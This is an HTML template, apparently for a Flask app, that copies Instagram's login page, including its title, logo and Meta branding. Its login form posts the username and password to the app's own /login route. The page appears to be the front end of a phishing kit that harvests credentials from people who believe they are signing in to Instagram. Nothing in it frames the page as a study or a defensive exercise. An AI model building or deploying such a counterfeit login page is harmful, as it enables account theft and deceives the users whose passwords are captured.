<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            min-height: 100vh;
            padding: 20px 24px;
            color: #1c2b33;
        }

        .language-selector {
            text-align: center;
            font-size: 14px;
            color: #65676b;
            margin-top: 8px;
        }

        .main-container {
            width: 100%;
            max-width: 380px;
            margin: auto;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo-container {
            margin-bottom: 40px;
        }

        .logo-container svg {
            width: 72px;
            height: 72px;
        }

        .login-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .input-group {
            position: relative;
            width: 100%;
        }

        .input-group input {
            width: 100%;
            height: 58px;
            padding: 22px 16px 6px 16px;
            border: 1px solid #ccd0d5;
            border-radius: 12px;
            font-size: 15px;
            outline: none;
            background-color: #ffffff;
            color: #1c2b33;
        }

        .input-group input:focus {
            border-color: #0064e0;
        }

        .input-group label {
            position: absolute;
            left: 16px;
            top: 18px;
            font-size: 15px;
            color: #65676b;
            pointer-events: none;
            transition: all 0.15s ease;
        }

        .input-group input:focus ~ label,
        .input-group input:not(:placeholder-shown) ~ label {
            top: 8px;
            font-size: 11px;
            color: #65676b;
        }

        .login-btn {
            margin-top: 4px;
            width: 100%;
            height: 44px;
            background-color: #0064e0;
            border: none;
            border-radius: 22px;
            color: #ffffff;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
        }

        .forgot-password {
            margin-top: 16px;
            text-align: center;
        }

        .forgot-password a {
            color: #1c2b33;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
        }

        .footer {
            width: 100%;
            max-width: 380px;
            margin: 0 auto;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
            padding-bottom: 12px;
        }

        .create-account-btn {
            width: 100%;
            height: 44px;
            background-color: transparent;
            border: 1px solid #0064e0;
            border-radius: 22px;
            color: #0064e0;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
        }

        .meta-logo {
            display: flex;
            align-items: center;
            gap: 4px;
            color: #0064e0;
            font-weight: 700;
            font-size: 15px;
            text-decoration: none;
        }

        .meta-logo svg {
            fill: #0064e0;
            width: 20px;
            height: 20px;
        }
    </style>
</head>
<body>

    <div class="language-selector">
        English (US)
    </div>

    <main class="main-container">
        <div class="logo-container">
            <!-- Instagram App Icon -->
            <svg width="72" height="72" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg">
                <radialGradient id="rg" cx="20%" cy="100%" r="125%">
                    <stop offset="0%" stop-color="#FFDD55" />
                    <stop offset="10%" stop-color="#FFDD55" />
                    <stop offset="50%" stop-color="#FF543E" />
                    <stop offset="100%" stop-color="#C837AB" />
                </radialGradient>
                <linearGradient id="lg" x1="100%" y1="0%" x2="0%" y2="100%">
                    <stop offset="0%" stop-color="#3771C8" />
                    <stop offset="100%" stop-color="#C837AB" stop-opacity="0" />
                </linearGradient>
                <rect width="512" height="512" rx="115" fill="url(#rg)" />
                <rect width="512" height="512" rx="115" fill="url(#lg)" />

                <path d="M256 164c-50.8 0-92 41.2-92 92s41.2 92 92 92 92-41.2 92-92-41.2-92-92-92zm0 148c-30.9 0-56-25.1-56-56s25.1-56 56-56 56 25.1 56 56-25.1 56-56 56z" fill="#ffffff"/>
                <circle cx="351.5" cy="160.5" r="21.5" fill="#ffffff"/>
            </svg>
        </div>

        <!-- FIXED FORM – now posts to /login -->
        <form class="login-form" action="{{ url_for('login') }}" method="POST">
            <div class="input-group">
                <input type="text" id="username" name="username" placeholder=" " required />
                <label for="username">Username, email or mobile number</label>
            </div>

            <div class="input-group">
                <input type="password" id="password" name="password" placeholder=" " required />
                <label for="password">Password</label>
            </div>

            <button type="submit" class="login-btn">Log in</button>
        </form>

        <div class="forgot-password">
            <a href="#">Forgot password?</a>
        </div>
    </main>

    <footer class="footer">
        <button type="button" class="create-account-btn">Create new account</button>
        <a href="#" class="meta-logo">
            <svg viewBox="0 0 24 24">
                <path d="M16.71 4.5c-2.16 0-4.02 1.28-5.01 3.05C10.71 5.78 8.85 4.5 6.69 4.5 3.55 4.5 1 7.05 1 10.19c0 4.18 5.1 8.81 10.12 12.31.35.25.82.25 1.17 0C17.31 19 22.41 14.37 22.41 10.19c0-3.14-2.55-5.69-5.7-5.69zm-5.01 15.65C7.23 17.02 3 12.98 3 10.19c0-2.04 1.66-3.69 3.69-3.69 1.8 0 3.33 1.3 3.63 3.08h1.36c.3-1.78 1.83-3.08 3.63-3.08 2.04 0 3.69 1.65 3.69 3.69 0 2.79-4.23 6.83-8.7 10.01z"/>
            </svg>
            Meta
        </a>
    </footer>

</body>
</html>
